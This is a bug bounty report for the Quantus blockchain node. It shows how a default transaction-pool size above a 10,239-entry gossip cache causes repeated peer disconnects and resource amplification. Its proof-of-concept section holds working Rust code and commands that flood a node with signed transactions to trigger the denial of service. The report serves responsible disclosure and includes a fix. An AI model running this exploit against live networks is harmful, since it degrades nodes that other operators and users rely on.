# 90210 bc medium quantus s 36 772 transaction default crosses the 10 239 entry gossip cache causing repeated full peer disconnects and node resource amplification

**Submitted on Aug 23rd 2026 at 18:52:29 UTC by @tinnohofficial for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90210
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

Quantus increased the compiled transaction-pool defaults from 8,192 transactions / 20 MiB to **36,772 transactions / 256 MiB** to accommodate its approximately 7.3 KB post-quantum transactions. This crosses a separate transaction-networking limit that retains only 10,239 known hashes per peer.

At exactly 10,240 ready transactions, the per-peer LRU enters an all-miss cycle. Every 2.9 seconds the node tries to resend all 10,240 large transactions to each full peer. The 2,048-message Litep2p queue fills and force-closes the entire transport connection, including block announcements. Reconnection clears the known-hash cache and restarts the same cycle.

The PoC uses ordinary signed, fee-paying `System.remark` transactions from one endowed ML-DSA-87 account. The attacker submits them to its own Quantus peer and gossips them over P2P; no RPC access to a victim is required. After the threshold is crossed, nodes repeatedly resend, allocate, disconnect, and reconnect without further attacker traffic.

## Vulnerability Details

### Quantus raises the pool above the networking boundary

The frozen node compiles these defaults:

```rust
/// Default sized for Quantus PQ signatures (~7300 bytes/tx) within ~268 MiB.
#[arg(long, value_name = "COUNT", default_value_t = 36772)]
pub pool_limit: usize,

/// Default is 262144 KiB (256 MiB), matching the previous hardcoded node sizing.
#[arg(long, value_name = "COUNT", default_value_t = 262144)]
pub pool_kbytes: usize,
```

See `client/cli/src/params/transaction_pool_params.rs:45-55`. `node/src/service.rs:619-629` passes this configuration directly to the production pool builder.

The transaction protocol independently uses:

```rust
pub(crate) const PROPAGATE_TIMEOUT: Duration = Duration::from_millis(2900);
pub(crate) const MAX_KNOWN_TRANSACTIONS: usize = 10240;
```

See `sc-network-transactions-0.54.0/src/config.rs:27-36`.

This boundary became reachable because of Quantus's pool-size change:

* Commit `d0511b169036d181049dd9764a9f6533ade4532b` first hardcoded a pool of 36,772 transactions / 256 MiB.
* Commit `8f4e0d5fbcddc8299ad13ccc10840044e3e702f2` moved the values into the current CLI defaults.
* The corresponding upstream CLI defaults are 8,192 transactions / 20 MiB, both below the trigger.

No operator override is required. A node started without `--pool-limit` selects 36,772 automatically.

The Quantus change introduces the capacity mismatch by compiling a ready-pool limit above the independently bounded gossip cache into every default node. The preceding 8,192-transaction / 20 MiB defaults remain below the trigger.

### The nominal 10,240-entry cache retains 10,239 hashes

`LruHashSet` documents an exclusive limit and evicts when its length reaches the configured value:

```rust
pub fn insert(&mut self, e: T) -> bool {
    if self.set.insert(e) {
        if self.set.len() == usize::from(self.limit) {
            self.set.pop_front();
        }
        return true
    }
    false
}
```

See `client/network/src/utils.rs:32-60`.

With 10,239 transactions, every hash remains cached and later scans send nothing. With 10,240 transactions in stable pool order, the first hash misses and evicts the second, the second evicts the third, and so on. Every hash misses on every scan.

Each peer receives a cache configured with `MAX_KNOWN_TRANSACTIONS`. Closing its transaction stream removes the entire peer record and cache: `sc-network-transactions-0.54.0/src/lib.rs:344-364`.

### One all-miss scan closes the whole transport

Every miss is sent as a separate synchronous notification:

```rust
for to_send in to_send {
    let _ = self
        .notification_service
        .send_sync_notification(who, vec![to_send].encode());
}
```

See `sc-network-transactions-0.54.0/src/lib.rs:470-509`. The production signed remarks are 7,263-7,264 bytes each, so a 10,240-entry pool contains approximately 70.93 MiB of encoded transactions.

Litep2p's synchronous queue holds 2,048 messages (`client/litep2p/src/protocol/notification/types.rs:30-34`). When it clogs, `send_sync_notification` queues `NotificationCommand::ForceClose` (`notification/handle.rs:378-404`). `force_close` then closes the connection even when other protocols have open substreams:

```rust
/// Forcibly close the connection, even if other protocols have substreams open over it.
pub fn force_close(&mut self, peer: PeerId) -> crate::Result<()> {
    // ...
    connection.primary.force_close()
}
```

See `client/litep2p/src/protocol/transport_service.rs:601-619`.

The result is a deterministic loop:

{% stepper %}
{% step %}

### Queue large notifications

The 2.9-second scan queues thousands of large notifications.
{% endstep %}

{% step %}

### Close the transport

The transaction protocol clogs and force-closes the whole connection.
{% endstep %}

{% step %}

### Close transaction and block-announcement streams

Transaction and block-announcement streams close together.
{% endstep %}

{% step %}

### Reconnect with an empty cache

The peer reconnects after the five-second backoff with an empty cache.
{% endstep %}

{% step %}

### Repeat the resend and closure cycle

The next scan resends the same pool and closes it again.
{% endstep %}
{% endstepper %}

### Distinction from public upstream issues

* Polkadot SDK issue [#8873](https://github.com/paritytech/polkadot-sdk/issues/8873) discusses generic notification clogs under CPU starvation, but not transaction gossip, the LRU cycle, or the 10,240 boundary.
* Issue [#11540](https://github.com/paritytech/polkadot-sdk/issues/11540#issuecomment-4184143612) observed whole-transport `ForceClose`, but protocol attribution found every event came from `grandpa/1` and **zero** from `transactions/1` or `block-announces/1`.
* Neither cited issue identifies the pool-size/cache interaction or this valid-transaction trigger.

## Impact Details

The issue was reproduced on two frozen-HEAD Quantus full nodes using default Litep2p and default pool settings.

At 10,239 ready transactions, both nodes retained their peer, notification counters stopped changing, no transaction or block stream closed, and CPU increased by only approximately 0.50 seconds during a 46-second stable window.

Submitting one additional signed transaction crossed the boundary. During the following 48 seconds, with no further submission:

```
source outgoing notifications = 46,006
source outgoing bytes         = 334,232,694
transaction stream closures   = 13
block stream closures         = 13
source RSS                    = 219,088 KiB (+100.7%)
source CPU rate               = +362%
victim CPU rate               = +159%
```

The one-transaction A/B transition isolates the cache boundary from startup load, slow-receiver behavior, and generic pool pressure.

In a separate four-node run, an original 74,393,535-byte transaction set produced 13,486,465,552 bytes and 1,856,363 outgoing notifications in approximately 18 minutes: **181 times** the original set size. The nodes recorded 1,220 transaction-stream closures, with matching block-announcement closure counts.

Sustainability was demonstrated by replenishing the 541 remarks admitted by one block in 7.793 seconds, below the 12-second target block interval. Maintaining the threshold costs approximately 4.267 UNIT per block in ordinary inclusion fees. Each valid transaction is submitted once; the affected nodes autonomously produce the repeated work.

The measured 159% increase in victim CPU exceeds the selected Medium impact's 30% resource-consumption threshold. Total network shutdown was not observed; blocks eventually propagated in the four-node test.

## Recommended Fix

Restore the invariant in Quantus's node configuration:

{% stepper %}
{% step %}

### Limit the compiled ready-pool default

Keep the compiled ready-pool default at or below 10,239 transactions.
{% endstep %}

{% step %}

### Add a startup guard and regression test

Prevent a default ready pool from exceeding the effective known-transaction capacity.
{% endstep %}
{% endstepper %}

As defense in depth, increase the per-peer cache, bound each propagation pass, and avoid closing the entire transport when one notification protocol clogs. Changing only the byte limit is insufficient unless it guarantees fewer than 10,240 of the smallest accepted extrinsics.

## References

* `client/cli/src/params/transaction_pool_params.rs:45-80` - Quantus pool defaults.
* `node/src/service.rs:619-629` - production pool wiring.
* `client/network/src/utils.rs:32-60` - exclusive LRU capacity.
* `client/litep2p/src/protocol/notification/types.rs:30-34` - 2,048-message queue.
* `client/litep2p/src/protocol/notification/handle.rs:378-404` - queue clog schedules `ForceClose`.
* `client/litep2p/src/protocol/transport_service.rs:601-619` - whole-connection closure.
* `sc-network-transactions-0.54.0/src/config.rs:27-39` - scan interval and cache limit.
* `sc-network-transactions-0.54.0/src/lib.rs:344-364,470-537` - cache lifecycle and send loop.
* Quantus commits `d0511b169036d181049dd9764a9f6533ade4532b` and `8f4e0d5fbcddc8299ad13ccc10840044e3e702f2`.

## Proof of Concept

### PoC 1: Exact LRU Boundary

Create `client/network/examples/quantus_lru_cycle.rs` in the frozen chain repository with this code:

```rust
use sc_network::utils::LruHashSet;
use std::num::NonZeroUsize;

const CACHE_LIMIT: usize = 10_240;

fn scan(cache: &mut LruHashSet<u32>, transaction_count: u32) -> usize {
    (0..transaction_count)
        .filter(|hash| cache.insert(*hash))
        .count()
}

fn main() {
    for transaction_count in [10_239, 10_240, 36_772] {
        let mut cache = LruHashSet::new(NonZeroUsize::new(CACHE_LIMIT).unwrap());
        let first_scan = scan(&mut cache, transaction_count);
        let second_scan = scan(&mut cache, transaction_count);
        let third_scan = scan(&mut cache, transaction_count);
        println!(
            "transactions={transaction_count} first_misses={first_scan} second_misses={second_scan} third_misses={third_scan}"
        );
    }
}
```

Run it with:

```bash
cargo run -p sc-network --example quantus_lru_cycle
```

The cache PoC prints:

```
transactions=10239 first_misses=10239 second_misses=0 third_misses=0
transactions=10240 first_misses=10240 second_misses=10240 third_misses=10240
transactions=36772 first_misses=36772 second_misses=36772 third_misses=36772
```

### PoC 2: Live Quantus Transaction Gossip

Create `runtime/examples/quantus_transaction_gossip_dos.rs` with this code. It generates production ML-DSA-87 signed `System.remark` extrinsics with every frozen-runtime transaction extension and submits them in JSON-RPC batches.

```rust
use codec::Encode;
use frame_support::{dispatch::GetDispatchInfo, traits::Get};
use qp_dilithium_crypto::Dilithium87Pair;
use quantus_runtime::{
    transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
    Runtime, RuntimeCall, Signature, SignedPayload, SystemCall, TxExtension, UncheckedExtrinsic,
    UNIT, VERSION,
};
use sp_core::{Pair, H256};
use sp_runtime::{generic::Era, traits::IdentifyAccount, AccountId32, MultiAddress};
use std::{
    env,
    io::{Read, Write},
    net::TcpStream,
    time::{Duration, Instant},
};

fn signed_remark(
    pair: &Dilithium87Pair,
    sender: &AccountId32,
    nonce: u32,
    genesis_hash: H256,
) -> UncheckedExtrinsic {
    let call: RuntimeCall = SystemCall::remark { remark: Vec::new() }.into();
    let tx_ext: TxExtension = (
        frame_system::CheckNonZeroSender::<Runtime>::new(),
        frame_system::CheckSpecVersion::<Runtime>::new(),
        frame_system::CheckTxVersion::<Runtime>::new(),
        frame_system::CheckGenesis::<Runtime>::new(),
        frame_system::CheckEra::<Runtime>::from(Era::immortal()),
        frame_system::CheckNonce::<Runtime>::from(nonce),
        frame_system::CheckWeight::<Runtime>::new(),
        ReversibleTransactionExtension::<Runtime>::new(),
        WormholeProofRecorderExtension::<Runtime>::new(),
        pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
        frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
        frame_system::WeightReclaim::<Runtime>::new(),
    );
    let payload = SignedPayload::from_raw(
        call.clone(),
        tx_ext.clone(),
        (
            (),
            VERSION.spec_version,
            VERSION.transaction_version,
            genesis_hash,
            genesis_hash,
            (),
            (),
            (),
            (),
            (),
            None,
            (),
        ),
    );
    let signature = payload.using_encoded(|bytes| pair.sign(bytes));
    UncheckedExtrinsic::new_signed(
        call,
        MultiAddress::Id(sender.clone()),
        Signature::Dilithium87(signature),
        tx_ext,
    )
}

fn parse_hash(value: &str) -> H256 {
    let hex = value.strip_prefix("0x").unwrap_or(value);
    assert_eq!(hex.len(), 64, "genesis hash must contain 32 bytes");
    let mut bytes = [0u8; 32];
    for (index, byte) in bytes.iter_mut().enumerate() {
        *byte = u8::from_str_radix(&hex[index * 2..index * 2 + 2], 16)
            .expect("genesis hash must be hexadecimal");
    }
    H256::from(bytes)
}

fn encode_hex(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        output.push(HEX[(byte >> 4) as usize] as char);
        output.push(HEX[(byte & 0x0f) as usize] as char);
    }
    output
}

fn submit_batch(port: u16, body: &str) -> String {
    let mut stream = TcpStream::connect(("127.0.0.1", port)).expect("RPC connection failed");
    stream
        .set_read_timeout(Some(Duration::from_secs(120)))
        .expect("read timeout configuration failed");
    stream
        .set_write_timeout(Some(Duration::from_secs(120)))
        .expect("write timeout configuration failed");
    write!(
        stream,
        "POST / HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    )
    .expect("RPC request failed");
    stream.flush().expect("RPC request flush failed");

    let mut response = Vec::new();
    stream
        .read_to_end(&mut response)
        .expect("RPC response failed");
    String::from_utf8(response).expect("RPC response was not UTF-8")
}

fn main() {
    let args = env::args().collect::<Vec<_>>();
    assert!(
        args.len() >= 3,
        "usage: quantus_transaction_gossip_dos <rpc-port> <genesis-hash> [start-nonce] [count] [batch-size]"
    );
    let port = args[1].parse::<u16>().expect("invalid RPC port");
    let genesis_hash = parse_hash(&args[2]);
    let start_nonce: u32 = args
        .get(3)
        .map_or(0, |value| value.parse().expect("invalid start nonce"));
    let count: u32 = args
        .get(4)
        .map_or(10_240, |value| value.parse().expect("invalid count"));
    let batch_size: u32 = args
        .get(5)
        .map_or(64, |value| value.parse().expect("invalid batch size"));
    assert!(batch_size > 0);

    let pair = Dilithium87Pair::from_seed_slice(&[0u8; 32]).expect("Alice seed is valid");
    let sender = pair.public().into_account();
    let sample = signed_remark(&pair, &sender, start_nonce, genesis_hash);
    let sample_len = sample.encode().len();
    let info = sample.get_dispatch_info();
    let base_weight = <Runtime as frame_system::Config>::BlockWeights::get()
        .get(info.class)
        .base_extrinsic;
    let base_fee = pallet_transaction_payment::Pallet::<Runtime>::weight_to_fee(base_weight);
    let weight_fee =
        pallet_transaction_payment::Pallet::<Runtime>::weight_to_fee(info.total_weight());
    let length_fee =
        pallet_transaction_payment::Pallet::<Runtime>::length_to_fee(sample_len as u32);
    let total_fee = base_fee + weight_fee + length_fee;
    let priority = pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::get_priority(
        &info, sample_len, 0, total_fee,
    );
    println!(
        "sample_bytes={sample_len} notification_bytes={} base_fee={base_fee} weight_fee={weight_fee} length_fee={length_fee} total_fee={total_fee} total_fee_units={:.9} priority={priority}",
        vec![sample].encode().len(),
        total_fee as f64 / UNIT as f64,
    );
    if count == 0 {
        return;
    }

    let started = Instant::now();
    let end_nonce = start_nonce
        .checked_add(count)
        .expect("nonce range overflow");
    let mut submitted = 0u32;
    let mut encoded_bytes = 0usize;

    for batch_start in (start_nonce..end_nonce).step_by(batch_size as usize) {
        let batch_end = batch_start.saturating_add(batch_size).min(end_nonce);
        let mut body = String::from("[");
        for nonce in batch_start..batch_end {
            if nonce != batch_start {
                body.push(',');
            }
            let encoded = signed_remark(&pair, &sender, nonce, genesis_hash).encode();
            encoded_bytes += encoded.len();
            let extrinsic = encode_hex(&encoded);
            body.push_str(&format!(
                "{{\"jsonrpc\":\"2.0\",\"id\":{nonce},\"method\":\"author_submitExtrinsic\",\"params\":[\"0x{extrinsic}\"]}}"
            ));
        }
        body.push(']');

        let response = submit_batch(port, &body);
        if !response.starts_with("HTTP/1.1 200") || response.contains("\"error\"") {
            panic!("RPC batch {batch_start}..{batch_end} failed: {response}");
        }
        submitted += batch_end - batch_start;
        if submitted == count || submitted % 512 == 0 {
            println!(
                "submitted={submitted}/{count} nonce={} encoded_mib={:.3} elapsed_s={:.3}",
                batch_end - 1,
                encoded_bytes as f64 / 1_048_576.0,
                started.elapsed().as_secs_f64()
            );
        }
    }
}
```

Build the node and live PoC from the repository root:

```bash
cargo build -p quantus-node
cargo build -p quantus-runtime --example quantus_transaction_gossip_dos
```

### Run Two Nodes

#### Node A

```bash
./target/debug/quantus-node \
  --chain dev --base-path /tmp/quantus-gossip-a \
  --listen-addr /ip4/127.0.0.1/tcp/30447 --rpc-port 9977 \
  --prometheus-port 9647 --no-telemetry --no-mdns \
  --node-key 7777777777777777777777777777777777777777777777777777777777
```

#### Node B

```bash
./target/debug/quantus-node \
  --chain dev --base-path /tmp/quantus-gossip-b \
  --listen-addr /ip4/127.0.0.1/tcp/30448 --rpc-port 9978 \
  --prometheus-port 9648 --no-telemetry --no-mdns \
  --bootnodes /ip4/127.0.0.1/tcp/30447/p2p/Qmf6HF8HUo8wo7ForUC7tQt1p8dTbFEoMYoDGn4oC5G1vf \
  --node-key 8888888888888888888888888888888888888888888888888888888888
```

Both are non-authorities, so the chain remains at genesis and isolates transaction gossip.

Submit the non-triggering side of the boundary to node A:

```bash
./target/debug/examples/quantus_transaction_gossip_dos \
  9977 \
  0xdf023821bb62749c1e602f7352fa28661cbdc465e0586e8ac7026f8f132921ba \
  0 10239 64
```

Wait at least 20 seconds. Both pools remain at 10,239, both nodes retain one peer, and notification counters stop changing.

Cross the boundary with one transaction:

```bash
./target/debug/examples/quantus_transaction_gossip_dos \
  9977 \
  0xdf023821bb62749c1e602f7352fa28661cbdc465e0586e8ac7026f8f132921ba \
  10239 1 1
```

Within seconds, transaction and block-announcement closure counters rise together, peers repeatedly fall to zero, and outgoing transaction bytes grow on every reconnect without further submissions.

Relevant metrics are available on `http://127.0.0.1:9647/metrics` and `:9648/metrics`:

```bash
curl -s http://127.0.0.1:9647/metrics | \
  rg 'ready_transactions|peers_count|notifications_sizes_(sum|count).*transactions/1|notifications_streams_(closed|opened)_total.*(block-announces|transactions)/1'
```
